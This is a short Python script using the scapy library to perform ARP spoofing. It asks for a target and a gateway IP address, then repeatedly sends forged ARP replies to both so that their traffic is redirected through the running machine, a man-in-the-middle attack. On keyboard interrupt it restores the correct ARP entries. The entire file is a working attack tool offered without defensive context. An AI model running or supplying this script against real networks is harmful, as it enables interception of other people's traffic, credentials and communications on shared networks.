import scapy.all as scapy
from scapy.layers.l2 import ARP
import time


interval = 5

ip_target = input("Enter target IP address: ")
ip_gateway = input("Enter gateway IP address: ")


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip) # (op code 2 = response to the broadcast)
    scapy.send(packet, verbose = False)


# reverse process for spoofing: (so that the client's internet will work properly again)
def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)

    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose=False)


try:
    while True:     # running until keyboard interruption
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
except KeyboardInterrupt:
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)